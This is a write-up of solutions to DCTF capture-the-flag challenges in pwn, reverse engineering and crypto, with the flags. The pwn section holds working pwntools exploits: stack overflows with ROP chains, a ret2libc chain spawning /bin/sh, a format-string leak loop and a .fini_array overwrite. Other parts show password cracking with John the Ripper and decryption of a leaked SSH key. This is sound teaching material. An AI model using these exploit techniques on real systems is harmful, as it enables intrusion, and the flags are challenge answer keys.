# ***PWN***

## ***PWN_SANITY_CHECK***

```py
from pwn import *

binary = context.binary = ELF('./pwn_sanity_check')
p = remote('dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io', 7480)

pop_rdi = next(binary.search(asm('pop rdi; ret')))
pop_rsi_r15 = next(binary.search(asm('pop rsi; pop r15; ret')))

payload  = b''
payload += b'A' * 72
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(pop_rsi_r15)
payload += p64(0x1337c0de)
payload += p64(0)
payload += p64(binary.sym.win)

p.sendlineafter('joke\n',payload)
p.interactive()
```
FLAG: ***``dctf{Ju5t_m0v3_0n}``***

## ***PINCH_ME***

```py
from pwn import *

binary = context.binary = ELF('./pinch_me')
p = remote('dctf1-chall-pinch-me.westeurope.azurecontainer.io', 7480)

payload  = b''
payload += b'A' * 24
payload += p64(0x1337c0de)

p.sendlineafter('?\n',payload)
p.interactive()
```
FLAG : ``***dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}``***

## ***README***

The vuln function reads flag.txt into a local (local_58) stack array.

The vulnerability is the printf(local_38) statement that is missing a format string. Exfiltrating the flag is as simple as passing %nn$p format strings where nn is the position in the stack; starting from 6 just increment until the output starts with dctf (nn = 8), then continue until you have the flag.

```c
for((p=8;p<14;p++)) {
    echo '%'$p'$p' | \
    nc dctf-chall-readme.westeurope.azurecontainer.io 7481 | \
    grep 'hello ' | \
    awk -Fx '{print $NF}' | \
    xxd -r -p | \
    rev
}
```

This bash script will echo %8$p, then echo %9$p, etc... into the challenge service serially (one by one), capturing the output (grep, awk), converting to text (xxd), and then finally reversing the string (rev, since x86_64 is little endian).

```
dctf{n0w_g0_r3ad_s0me_b0rev: stdin: Invalid or incomplete multibyte or wide character
rev: stdin: Invalid or incomplete multibyte or wide character
rev: stdin: Invalid or incomplete multibyte or wide character
```
By guessing the last letters as `0k5`.

FLAG : ***```dctf{n0w_g0_r3ad_s0me_b00k5}```***

## ***MAGIC_TRICK***

```py
from pwn import *

binary = context.binary = ELF('./magic_trick')

p = remote('dctf-chall-magic-trick.westeurope.azurecontainer.io', 7481)

p.sendlineafter('write\n', str(binary.sym.win))
p.sendlineafter('it\n', str(binary.get_section_by_name('.fini_array').header.sh_addr))
print(p.recvuntil('}').decode())
```

FLAG : ***```dctf{1_L1k3_M4G1c}```***

## ***BABY_BOF***

```py
from pwn import *

binary = context.binary = ELF('./baby_bof')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

if args.REMOTE:
    p = remote('dctf-chall-baby-bof.westeurope.azurecontainer.io', 7481)
    libc = ELF('./libc.so.6')
else:
    p = process(binary.path)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = next(binary.search(asm('pop rdi; ret')))

payload  = b''
payload += 0x12 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.vuln)

p.sendlineafter('me\n',payload)
p.recvuntil('work\n')

puts = u64(p.recv(6) + b'\0\0')
log.info('puts: ' + hex(puts))
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

payload  = 0x12 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)

p.sendlineafter('me\n',payload)
p.recvuntil('work\n')
p.interactive()
```
https://github.com/datajerk/ctf-write-ups/blob/master/INDEX.md

similiar : https://github.com/datajerk/ctf-write-ups/tree/master/darkctf2020/roprop 
           
   https://github.com/datajerk/ctf-write-ups/tree/master/downunderctf2020/return_to_what
   
# ***REVERSE ENGINEERING***

## **BELL**

```py
def triangle(a, b):
    lVar1 = lVar2 = 0

    if a < b:
        lVar1 = 0
    else:
        if (a == 1) and (b == 1):
            lVar1 = 1
        else:
            if b == 1:
                lVar1 = triangle(a - 1, a - 1)
            else:
                lVar2 = triangle(a, b - 1)
                lVar1 = triangle(a - 1, b - 1)
                lVar1 = lVar1 + lVar2
    return lVar1


n = int(input("Enter the first number that was printed: "))
for k in range(1, n + 1):
    print(triangle(n, k))
```
By running the ```nc dctf-chall-bell.westeurope.azurecontainer.io 5311```

By giving the number that came in when we enter the port in the above program we get some values if we enter those values in the port we get the flag.

FLAG : ***```dctf{f1rst_step_t0wards_b3ll_l4bs}```***

## ***JUST IN TIME***

This will give the flag.

***```ltrace -s 90 ./justintime````***
```
malloc(8)                                        = 0x5631a2b6e2a0
malloc(8)                                        = 0x5631a2b6e2c0
fopen(&quot;./justintime&quot;, &quot;rb&quot;)                      = 0x5631a2b6e2e0
fread(0x5631a2b6e2c0, 8, 1, 0x5631a2b6e2e0)      = 1
fclose(0x5631a2b6e2e0)                           = 0
strncpy(0x5631a2b6e2a0, &quot;\177ELF\002\001\001&quot;, 8) = 0x5631a2b6e2a0
malloc(39)                                       = 0x5631a2b6e4c0
strncpy(0x5631a2b6e4c0, &quot;\033&amp;8 yegHr($g1bKu{&quot;f5`N}t#331Nv/%`11F#1&quot;, 39) = 0x5631a2b6e4c0
strlen(&quot;\033&amp;8 yegHr($g1bKu{&quot;f5`N}t#331Nv/%`11F#1&quot;) = 38
puts(&quot;Decryption finished.&quot;Decryption finished.
)                     = 21
malloc(39)                                       = 0x5631a2b6e900
malloc(40)                                       = 0x5631a2b6e930
strncpy(0x5631a2b6e900, &quot;dctf{df77dbe0c407dd4a188e12013ccb009f}&quot;, 39) = 0x5631a2b6e900
malloc(40)                                       = 0x5631a2b6e960
strlen(&quot;\033&amp;8 yegHr($g1bKu{&quot;f5`N}t#331Nv/%`11F#1&quot;) = 38
free(0x5631a2b6e4c0)                             = &lt;void&gt;
free(0x5631a2b6e960)                             = &lt;void&gt;
free(0x5631a2b6e2a0)                             = &lt;void&gt;
+++ exited (status 0) +++
```

FLAG : ***``dctf{df77dbe0c407dd4a188e12013ccb009f}``***

## ***TINY INTERPRETER***

We are given to files one interprter file and bin file.

If we run **``./interpreter``** bin we get the flag.

FLAG : ***``dctf{Interpreter_written_in_C_is_a_great_idea}``***

# ***CRYPTO***

## ***THIS ONE IS REALLY BASIC***

```py
import base64
cipher = ""
with open('cipher.txt', 'r') as f:
    cipher = f.readlines()

real_cipher = cipher[0].strip()

for i in range(42):
    real_cipher = base64.b64decode(real_cipher).decode()

print(real_cipher)
```

FLAG : ***```dctf{Th1s_l00ks_4_lot_sm4ll3r_th4n_1t_d1d}```***

## ***STRONG PASSWORD***

WE can crack the password using *`JOHN THE RIPPER`*

***```zip2john strong_password.zip > zip.hash```***

***```john --wordlist=rockyou.txt zip.hash```***

We get the password as **``Bo38AkRcE600X8DbK3600``**

In the lorem.txt we find the flag by ``cat lorem.txt | grep dctf``

Flag: ***```dctf{r0cKyoU_f0r_tHe_w1n}```***

## ***JULIUS ANCIENT SCRIPT***

We are given a flag.txt 

We can get the flag by decoding as ceaser cipher 

FLAG : ***```dcTf{Th3_d13_h4S_b33N_c4ST}```***

## ***FORGOTTEN SECRET***

For this challenge you were given a docker image and a hint that it doesn't follow best practices. To get the files from the image, you just need to untar it:
```
tar xf image
for f in `ls */layer.tar`; do tar xf $f; done
This leaves us with 3 files of interest among the extracted files: 7dabd7d32d701c6380d8e9f053d83d050569b063fbcf7ebc65e69404bed867a5.json, root/.ssh/id_rsa and home/alice/cipher.bin. After viewing the SSH private key in id_rsa and the ciphertext in cipher.bin, I had a look in 7dabd7d32d701c6380d8e9f053d83d050569b063fbcf7ebc65e69404bed867a5.json. In this file, everything is normal except for a leaked environment variable, SECRET_KEY. But how can this help us?
```

So, after trying to open id_rsa in the python interpreter, we get an invalid key format error. So, that must mean that id_rsa is encrypted. But with which key? Luckily we have SECRET_KEY from before.
```py
from Crypto.PublicKey import RSA
from Crypto.Util.number import bytes_to_long, long_to_bytes

SECRET_KEY = '58703273357638792F423F4528482B4D6251655468566D597133743677397A24'
f_key = open('root/.ssh/id_rsa')
f_ct = open('home/alice/cipher.bin', 'rb')
key_txt = f_key.read()
ct = f_ct.read()

key = RSA.import_key(key_txt, passphrase=SECRET_KEY)
pt = long_to_bytes(pow(bytes_to_long(ct), key.d, key.n))
print(pt)
```
As there were only three files of interest, is was obvious that cipher.bin would be what needs decryption. After unlocking the SSH private key id_rsa, I just converted the ciphertext to an integer, and manually decrypted it with c^d mod n.

## ***SCOOBY-DOO***

```c
a="ABCDEFGHIJKLMNOPQRSTUVWXYZ"

for i in {1..22}
do
s=$(cat cipher.txt | cut -b "$i" | tr -d '\n')
  for x in {0..25}
  do
      c=${a:$x:1}
      if [[ $s == *"$c"* ]]
      then
          printf ''
      else
          printf ${a:$x:1}
      fi
   done
done
```

FLAG : ***```DCTFTURINGWOULDBEPROUD```***

## ***TAKE YOUR TIME***

```py
import socket
from time import time
from Crypto.Cipher import DES3
from binascii import unhexlify

remotehost = "dctf-chall-just-take-your-time.westeurope.azurecontainer.io"
remoteport = 9999

# Connect to the remote side and capture the output
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((remotehost, remoteport))
output1 = str(s.recv(1024).decode("utf-8"))
print("debug remote output:\n" + output1 + "\n")

# Parse and process the output to calculate result 1
remotelines = output1.splitlines();
num1 = remotelines[1].split()[0];
num2 = remotelines[1].split()[2];
print("debug number extract: 1=" + num1 + " 2=" + num2)
result1 = str(int(num1) * int(num2))
print("debug multiplication: " + result1)

# Send result to remote side, and check response
s.send(bytearray(result1 + "\n", 'utf-8'))
output2 = str(s.recv(1024).decode("utf-8"))
print("debug remote output:\n" + output2 + "\n")

# Parse and process the output to calculate result 2
remotelines = output2.splitlines();
enc = remotelines[1];
print("debug cipher extract: enc=" + enc)

# Generate the decryption key based on the timestamp
key = str(int(time())).zfill(16).encode("utf-8")
print("debug decryption key: key=" + str(key.decode("utf-8")))

# Decrypt the ciphertext
cipher = DES3.new(key, DES3.MODE_CFB, b"00000000")
cleartext = str(cipher.decrypt(unhexlify(enc)).decode("utf-8"))
print("debug show cleartext: clr=" + cleartext)

# Sent decryption result to remote, and check for flag
s.send(bytearray(cleartext + "\n", 'utf-8'))
output3 = str(s.recv(1024).decode("utf-8"))
print("debug remote output:\n" + output3 + "\n")
```
